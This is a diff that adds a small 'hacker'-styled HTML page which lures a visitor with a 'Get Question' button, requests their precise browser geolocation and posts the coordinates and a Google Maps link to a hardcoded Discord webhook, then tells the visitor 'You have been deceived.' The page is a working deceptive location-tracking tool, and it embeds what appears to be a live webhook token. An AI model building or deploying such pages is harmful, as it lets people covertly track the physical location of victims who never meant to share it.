@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>🧠 Hacker Mode | Location Sender</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+    /* เบสสีและฟอนต์สาย Cyberpunk */
+    body {
+      background: radial-gradient(circle at center, #0f0f0f, #000);
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      text-align: center;
+      padding-top: 120px;
+      user-select: none;
+    }
+
+    h1 {
+      font-size: 3.5rem;
+      letter-spacing: 0.25em;
+      text-shadow:
+        0 0 8px #00ff00,
+        0 0 16px #00ff00,
+        0 0 24px #00ff00;
+      margin-bottom: 1rem;
+      animation: flicker 3s infinite;
+    }
+
+    /* ปุ่มสไตล์ Terminal Hacker */
+    #locateBtn {
+      background: transparent;
+      border: 2px solid #00ff00;
+      padding: 18px 40px;
+      font-size: 1.8rem;
+      color: #00ff00;
+      cursor: pointer;
+      border-radius: 8px;
+      box-shadow:
+        0 0 8px #00ff00,
+        inset 0 0 6px #00ff00;
+      transition: background 0.3s ease, color 0.3s ease;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+    }
+
+    #locateBtn:hover {
+      background: #00ff00;
+      color: #000;
+      box-shadow:
+        0 0 16px #00ff00,
+        inset 0 0 12px #00ff00;
+    }
+
+    /* ข้อความผลลัพธ์ */
+    #output {
+      margin-top: 2rem;
+      font-size: 1.4rem;
+      line-height: 1.6;
+      text-shadow:
+        0 0 4px #00ff00;
+      min-height: 80px;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      white-space: pre-wrap;
+      user-select: text;
+    }
+
+    /* Animation ไฟกระพริบ */
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+        opacity: 1;
+      }
+      20%, 22%, 24%, 55% {
+        opacity: 0.5;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>My Locate</h1>
+
+  <button id="locateBtn">Get Question</button>
+
+  <p id="output" aria-live="polite" aria-atomic="true"></p>
+
+  <script>
+    const btn = document.getElementById('locateBtn');
+    const output = document.getElementById('output');
+
+    btn.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        output.textContent = '❌ Your browser does not support Geolocation API.';
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'LOCATING...';
+      output.textContent = '';
+
+      navigator.geolocation.getCurrentPosition(success, error, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+
+      function success(position) {
+        const { latitude, longitude } = position.coords;
+
+        output.innerHTML = 
+          `✅ <strong>Latitude:</strong> ${latitude.toFixed(6)}<br>` +
+          `✅ <strong>Longitude:</strong> ${longitude.toFixed(6)}<br><br>` +
+          `<em>Sending data securely to server...</em>`;
+
+        sendToDiscord(latitude, longitude)
+          .then(() => {
+            output.innerHTML += `<br>📤 <strong>You locatetion sent to champion!</strong>`;
+            btn.textContent = 'You have been deceived.';
+            btn.disabled = false;
+          })
+          .catch(() => {
+            output.innerHTML += `<br>❌ <strong>Failed to send data. Try again later.</strong>`;
+            btn.textContent = 'Try Again';
+            btn.disabled = false;
+          });
+      }
+
+      function error(err) {
+        let msg = '❌ Unable to access location.';
+        if (err.code === err.PERMISSION_DENIED) msg = '⚠️ Permission denied by user.';
+        else if (err.code === err.POSITION_UNAVAILABLE) msg = '⚠️ Location information is unavailable.';
+        else if (err.code === err.TIMEOUT) msg = '⚠️ The request timed out.';
+        output.textContent = msg;
+        btn.textContent = 'GET LOCATION';
+        btn.disabled = false;
+      }
+    });
+
+    async function sendToDiscord(lat, lng) {
+      const webhookURL = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
+
+      const payload = {
+        content: 
+          `📍 User Location Captured!\n` +
+          `🌐 Latitude: ${lat.toFixed(6)}\n` +
+          `🌐 Longitude: ${lng.toFixed(6)}\n` +
+          `🗺️ Google Maps: https://maps.google.com/?q=${lat},${lng}`
+      };
+
+      const response = await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (!response.ok) throw new Error('Failed to send data to Discord');
+      return response;
+    }
+  </script>
+
+</body>
+</html>
